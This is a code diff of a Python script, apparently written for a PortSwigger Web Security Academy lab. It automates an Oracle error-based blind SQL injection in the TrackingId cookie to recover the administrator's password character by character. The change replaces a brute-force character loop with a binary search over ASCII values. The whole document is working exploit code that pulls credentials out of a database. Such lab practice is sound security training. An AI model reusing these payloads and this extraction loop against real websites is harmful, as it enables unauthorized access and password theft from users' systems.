@@ -1,15 +1,15 @@
 
-
+import math
 import requests
 import urllib
 
 proxies = {'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}
 
-url = 'https://0a8d00bf04dcc92f84a75027001100ce.web-security-academy.net/'
+url = 'https://0aac00cf0398498182d8987a00050076.web-security-academy.net/'
 
 headers = {
-    "Host": "0a8d00bf04dcc92f84a75027001100ce.web-security-academy.net",
-    "Cookie": "session=4AYvF1MlH1sUTE93wnlaPcc17SZniW2g; TrackingId=DKSWv80UKgZsH9Ot ",
+    "Host": "0aac00cf0398498182d8987a00050076.web-security-academy.net",
+    "Cookie": "session=4AYvF1MlH1sUTE93wnlaPcc17SZniW2g; TrackingId=ILap96rfY0oJGtEl",
     "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
     "Sec-Ch-Ua-Mobile": "?0",
     "Sec-Ch-Ua-Platform": '"Linux"',
@@ -44,37 +44,51 @@ while True:
 headers['Cookie'] = originalHeader
 password = ''
 for i in range(length):
-    for char in range(ord('a'),ord('z')+1):
-        temp = chr(char)
-        newheader = f"TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,{i+1},1)='{temp}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+    low = 47
+    high = 122
+    while(low<=high):
+        mid = math.floor((low+high)/2)
+        newheader = f"'||(SELECT CASE WHEN (ASCII(SUBSTR(password,{i+1},1)) < {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
         formatted_header = urllib.parse.quote(newheader,safe='')
         headers['Cookie'] += formatted_header
         response = requests.get(url, headers=headers, verify=False, proxies=proxies)
         headers['Cookie'] = originalHeader
         print(response.status_code)
         print(i + 1)
-        print(temp)
+        print(mid)
         if response.status_code == 500:
-            password+=temp
             headers['Cookie'] = originalHeader
-            break
-
-
-    for num in range(ord('0'),ord('9')+1):
-        temp = chr(num)
-        newheader = f"TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,{i+1},1)='{temp}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
-        formatted_header = urllib.parse.quote(newheader,safe='')
-        headers['Cookie'] += formatted_header
-        response = requests.get(url, headers=headers, verify=False, proxies=proxies)
-        headers['Cookie'] = originalHeader
-        print(response.status_code)
-        print(i+1)
-        print(temp)
-        if response.status_code == 500:
-            password+=temp
+            newheader = f"'||(SELECT CASE WHEN (ASCII(SUBSTR(password,{i+1},1)) = {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            formatted_header = urllib.parse.quote(newheader, safe='')
+            headers['Cookie'] += formatted_header
+            response = requests.get(url, headers=headers, verify=False, proxies=proxies)
             headers['Cookie'] = originalHeader
-            break
-        headers['Cookie'] = originalHeader
+            print("check char:")
+            print(response.status_code)
+            print(mid)
+            if response.status_code == 500:
+                password += chr(mid)
+                print(chr(mid))
+                break
+            else:
+                high = mid - 1
+        else:
+            headers['Cookie'] = originalHeader
+            newheader = f"'||(SELECT CASE WHEN (ASCII(SUBSTR(password,{i + 1},1)) = {mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            formatted_header = urllib.parse.quote(newheader, safe='')
+            headers['Cookie'] += formatted_header
+            response = requests.get(url, headers=headers, verify=False, proxies=proxies)
+            headers['Cookie'] = originalHeader
+            print("check char:")
+            print(response.status_code)
+            print(mid)
+            if response.status_code == 500:
+                password += chr(mid)
+                print(chr(mid))
+                break
+            else:
+                low = mid + 1
+
 print(password)
 
 
